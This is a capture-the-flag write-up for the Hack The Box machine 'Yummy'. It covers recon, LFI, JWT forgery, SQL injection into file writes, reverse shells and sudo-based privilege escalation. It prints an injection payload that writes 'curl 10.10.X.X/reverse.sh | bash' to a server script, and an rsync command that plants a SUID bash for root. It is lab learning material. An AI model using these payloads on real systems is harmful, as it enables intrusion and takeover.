---
layout: writeup
title: "Yummy"
date: 2026-06-16
description: "Walkthrough of HTB Yummy, a Hard Linux machine."
tags: [Box, hard, linux]
---

## Reconnaissance

A full TCP port scan was performed to identify exposed services on the target.

```bash
nmap -sVC -p- --open -sS --min-rate 5000 -v -n --stats-every=5s -Pn -oN yummy_scan <IP>
```

The scan revealed a web service running on the target.

![The scan revealed a web service running on the target](/assets/images/yummy/134-1.png)
*The scan revealed a web service running on the target*

Browsing the main page showed both Login and Register functionalities.

![Browsing the main page showed both Login and Register functionalities](/assets/images/yummy/134-2.png)
*Browsing the main page showed both Login and Register functionalities*

Technology fingerprinting was performed using `whatweb`, revealing that the site uses Caddy as the web server along with Bootstrap and other common web technologies.

**http://yummy.htb/** [200 OK] Bootstrap, Caddy, HTML5

## Application Interaction

A new user account was registered to interact with the application.

![A new user account was registered to interact with the application](/assets/images/yummy/134-3.png)
*A new user account was registered to interact with the application*

After logging in, a table reservation feature was used.

![After logging in, a table reservation feature was used](/assets/images/yummy/134-4.png)
*After logging in, a table reservation feature was used*

The request responsible for exporting data was intercepted using Burp Suite.

Upon inspection, the export functionality was found to be vulnerable to a Local File Inclusion (LFI).

![Upon inspection, the export functionality was found to be vulnerable to a Local File Inclusion (LFI)](/assets/images/yummy/134-5.png)
*Upon inspection, the export functionality was found to be vulnerable to a Local File Inclusion (LFI)*

![Upon inspection, the export functionality was found to be vulnerable to a Local File Inclusion (LFI)](/assets/images/yummy/134-6.png)
*Upon inspection, the export functionality was found to be vulnerable to a Local File Inclusion (LFI)*

## JWT Abuse – Alternative Access Method

An alternative attack vector involved intercepting the JWT token by capturing the login request when accessing `/admindashboard`.

The token was decoded using jwt.io.

![The token was decoded using jwt.io](/assets/images/yummy/134-7.png)
*The token was decoded using jwt.io*

A vulnerability was identified in the `n` variable within the token.

![A vulnerability was identified in the variable within the token](/assets/images/yummy/134-8.png)
*A vulnerability was identified in the variable within the token*

A forged JWT was crafted with administrator privileges.

![A forged JWT was crafted with administrator privileges](/assets/images/yummy/134-9.png)
*A forged JWT was crafted with administrator privileges*

Replacing the original token with the forged one granted access to the admin dashboard.

![Replacing the original token with the forged one granted access to the admin dashboard](/assets/images/yummy/134-10.png)
*Replacing the original token with the forged one granted access to the admin dashboard*

## Admin Dashboard Abuse

Within the admin dashboard, a script named `app_backup.sh` referenced a ZIP archive located at `/var/www/backupapp.zip`.

![Within the admin dashboard, a script named referenced a ZIP archive located at ](/assets/images/yummy/134-11.png)
*Within the admin dashboard, a script named referenced a ZIP archive located at *

![Within the admin dashboard, a script named referenced a ZIP archive located at ](/assets/images/yummy/134-12.png)
*Within the admin dashboard, a script named referenced a ZIP archive located at *

The archive was downloaded and extracted, revealing database credentials.

![The archive was downloaded and extracted, revealing database credentials](/assets/images/yummy/134-13.png)
*The archive was downloaded and extracted, revealing database credentials*

```bash
db_config = {
    'host': '127.0.0.1',
    'user': 'chef',
    'password': '3wDo7gSRZIwIHRxZ!',
    'database': 'yummy_db'
}
```

## SQL Injection to RCE

The admin dashboard URL was found to be vulnerable to SQL injection.

![The admin dashboard URL was found to be vulnerable to SQL injection](/assets/images/yummy/134-14.png)
*The admin dashboard URL was found to be vulnerable to SQL injection*

![The admin dashboard URL was found to be vulnerable to SQL injection](/assets/images/yummy/134-15.png)
*The admin dashboard URL was found to be vulnerable to SQL injection*

The injection was leveraged to write files to disk using `INTO OUTFILE`.

**Example payload:**

```bash
http://yummy.htb/admindashboard?s=aa&o=ASC; 
select "curl 10.10.X.X/reverse.sh | bash;" 
INTO OUTFILE '/data/scripts/fixer-v___';
```

![Example payload:](/assets/images/yummy/134-16.png)
*Example payload:*

![Example payload:](/assets/images/yummy/134-17.png)
*Example payload:*

This resulted in a shell as the MySQL user.

## Lateral Movement

To pivot to `www-data`, a reverse shell was created and renamed as `app_backup.sh`, which was executed automatically.

![Pivoting to www-data via a reverse shell renamed app_backup.sh](/assets/images/yummy/134-18.png)
*Pivoting to www-data via a reverse shell renamed app_backup.sh*

![Pivoting to www-data via a reverse shell renamed app_backup.sh](/assets/images/yummy/134-19.png)
*Pivoting to www-data via a reverse shell renamed app_backup.sh*

A reverse shell as `www-data` was successfully obtained.

![A reverse shell as was successfully obtained](/assets/images/yummy/134-20.png)
*A reverse shell as was successfully obtained*

Within `/var/www/`, an interesting directory containing application data and a ZIP file was discovered.

![An application directory under /var/www containing a ZIP archive](/assets/images/yummy/134-21.png)
*An application directory under /var/www containing a ZIP archive*

Inside `/app-qatesting/.hg/store/data`, the file `app.py.i` was found.

This file contained plaintext credentials for the `qa` and `chef` users.

![This file contained plaintext credentials for the and users](/assets/images/yummy/134-22.png)
*This file contained plaintext credentials for the and users*

![This file contained plaintext credentials for the and users](/assets/images/yummy/134-23.png)
*This file contained plaintext credentials for the and users*

Using the recovered credentials, access as the `qa` user was obtained.

![Using the recovered credentials, access as the user was obtained](/assets/images/yummy/134-24.png)
*Using the recovered credentials, access as the user was obtained*

The user flag was found in the `/home/qa/` directory.

![The user flag was found in the directory](/assets/images/yummy/134-25.png)
*The user flag was found in the directory*

## Privilege Escalation: qa → dev

For persistence, an SSH key pair was generated using `ssh-keygen`.

![For persistence, an SSH key pair was generated using ](/assets/images/yummy/134-26.png)
*For persistence, an SSH key pair was generated using *

Checking sudo permissions revealed that the `qa` user could execute Mercurial (`hg`) commands as the `dev` user.

![Checking sudo permissions revealed that the user could execute Mercurial () commands as the user](/assets/images/yummy/134-27.png)
*Checking sudo permissions revealed that the user could execute Mercurial () commands as the user*

A malicious Mercurial configuration was created in `/tmp` to trigger a reverse shell.

![A malicious Mercurial configuration was created in to trigger a reverse shell](/assets/images/yummy/134-28.png)
*A malicious Mercurial configuration was created in to trigger a reverse shell*

![A malicious Mercurial configuration was created in to trigger a reverse shell](/assets/images/yummy/134-29.png)
*A malicious Mercurial configuration was created in to trigger a reverse shell*

The `.hgrc` file was modified to execute a reverse shell script.

![The file was modified to execute a reverse shell script](/assets/images/yummy/134-30.png)
*The file was modified to execute a reverse shell script*

The reverse shell script was created and made executable.

![The reverse shell script was created and made executable](/assets/images/yummy/134-31.png)
*The reverse shell script was created and made executable*

```bash
chmod 777 revshell.sh
```

Executing the allowed sudo command spawned a shell as the `dev` user.

![Executing the allowed sudo command spawned a shell as the user](/assets/images/yummy/134-32.png)
*Executing the allowed sudo command spawned a shell as the user*

## Privilege Escalation: dev → root

Running `sudo -l` as `dev` showed that `rsync` could be executed as root.

![Running as showed that could be executed as root](/assets/images/yummy/134-33.png)
*Running as showed that could be executed as root*

The `rsync` command was abused to copy a SUID-enabled bash binary into a root-owned directory.

![The command was abused to copy a SUID-enabled bash binary into a root-owned directory](/assets/images/yummy/134-34.png)
*The command was abused to copy a SUID-enabled bash binary into a root-owned directory*

Finally, the privileged bash binary was executed to gain a root shell.

```bash
sudo /usr/bin/rsync -a --exclude=.hg /home/dev/app-production/* --chown root:root /opt/app/ && /opt/app/bash -p
```

![Finally, the privileged bash binary was executed to gain a root shell](/assets/images/yummy/134-35.png)
*Finally, the privileged bash binary was executed to gain a root shell*
